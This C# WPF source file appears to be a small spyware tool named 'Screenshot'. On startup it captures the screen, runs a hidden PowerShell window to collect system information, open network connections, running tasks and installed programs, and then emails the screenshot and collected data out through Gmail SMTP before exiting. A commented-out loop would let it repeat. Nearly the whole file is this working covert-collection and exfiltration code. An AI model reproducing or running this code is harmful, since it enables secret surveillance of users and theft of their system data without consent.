using System;
using System.Collections.Generic;
using System.Configuration;
using System.Data;
using System.Linq;
using System.Threading.Tasks;
using System.Windows;
using System.Drawing;
using System.Diagnostics;
using System.Threading;

namespace Screenshot
{
    /// <summary>
    /// Interaction logic for App.xaml
    /// </summary>
    public partial class App : Application
    {
        private void Application_Startup(object sender, StartupEventArgs e)
        {
            //while(true)
            //{
                Screenshot();
                Gather();
                Thread.Sleep(20000);
                Email("", "", "");
                System.Windows.Application.Current.Shutdown();
            //}

        }

        /* Take a screenshot */
        public void Screenshot()
        {
            Bitmap memoryImage;
            memoryImage = new Bitmap(1920, 1080);
            System.Drawing.Size s = new System.Drawing.Size(memoryImage.Width, memoryImage.Height);

            // Getting screen
            Graphics memoryGraphics = Graphics.FromImage(memoryImage);
            memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);

            // Save image 
            string str = "";
            try
            {
                str = string.Format(@".\screenshot.png");
            }
            catch (Exception er)
            {
                Console.WriteLine("Sorry, there was an error: " + er.Message);
                Console.WriteLine();
            }
            memoryImage.Save(str);
        }

        /* Gets system info, ports, tasks, installed programs*/
        public void Gather()
        {
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = @"powershell.exe";
            startInfo.Arguments = "& \"systeminfo /s LOCALHOST | Out-File output.txt; netstat -a -n -o | Out-File output.txt -append; tasklist | Out-File output.txt -append; Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize | Out-File output.txt -append;\"";
            startInfo.RedirectStandardOutput = true;
            startInfo.RedirectStandardError = true;
            startInfo.UseShellExecute = false;
            startInfo.CreateNoWindow = true;
            Process process = new Process();
            process.StartInfo = startInfo;
            process.Start();
        }

        /* Sends an email from a Gmail user to an email
           
            Parameters:
                from: Gmail username
                to: email address to send to
                password: password for YOUR Gmail
        */
        public void Email(string from, string to, string password)
        {
            string address = from + "@gmail.com";
            string time = DateTime.Now.ToString("F");

            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = "powershell.exe";
            startInfo.Arguments = "\"$MailMessage = New-Object Net.Mail.MailMessage(\'" + address + "\',\'" + to + "\');$MailMessage.Subject = \'" + time + "\';$MailMessage.Body = \'\';$Attachment = New-Object System.Net.Mail.Attachment(\'.\\output.txt\', \'text/plain\');$Screenshot = New-Object System.Net.Mail.Attachment(\'.\\screenshot.png\', \'image/png\');$MailMessage.Attachments.Add($Attachment);$MailMessage.Attachments.Add($Screenshot);$SMTPServer = \'smtp.gmail.com\';$SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, 587);$SMTPClient.EnableSsl = $true;$SMTPClient.Credentials = New-Object System.Net.NetworkCredential(\'" + from + "\',\'" + password + "\');$SMTPClient.Send($MailMessage);\"";
            startInfo.RedirectStandardOutput = true;
            startInfo.RedirectStandardError = true;
            startInfo.UseShellExecute = false;
            startInfo.CreateNoWindow = true;
            Process process = new Process();
            process.StartInfo = startInfo;
            process.Start();
        }
        
    }
}
